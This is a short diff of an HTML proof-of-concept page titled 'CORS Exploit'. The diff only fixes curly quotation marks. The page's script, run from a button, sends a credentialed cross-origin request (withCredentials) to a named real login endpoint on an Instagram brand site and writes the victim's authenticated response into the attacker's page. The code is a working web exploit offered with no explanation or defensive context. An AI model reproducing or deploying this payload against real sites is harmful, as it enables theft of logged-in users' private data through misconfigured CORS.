@@ -9,18 +9,18 @@
 
     <h1>CORS Exploit<br>Yeasir Arafat</h1>
     <hr>
-    <div id=”demo”>
-    <button type=”button” onclick=”cors()”>Exploit</button>
+    <div id="demo">
+    <button type="button" onclick="cors()">Exploit</button>
     </div>
-    <script type=”text/javascript”>
+    <script type="text/javascript">
     function cors() {
     var xhttp = new XMLHttpRequest();
     xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
-    document.getElementById(“demo”).innerHTML = this.responseText;
+    document.getElementById("demo").innerHTML = this.responseText;
     }
     };
-    xhttp.open(“GET”, “https://en.instagram-brand.com/wp-json/brc/v1/login/", true);
+    xhttp.open("GET", "https://en.instagram-brand.com/wp-json/brc/v1/login/", true);
     xhttp.withCredentials = true;
     xhttp.send();
     }
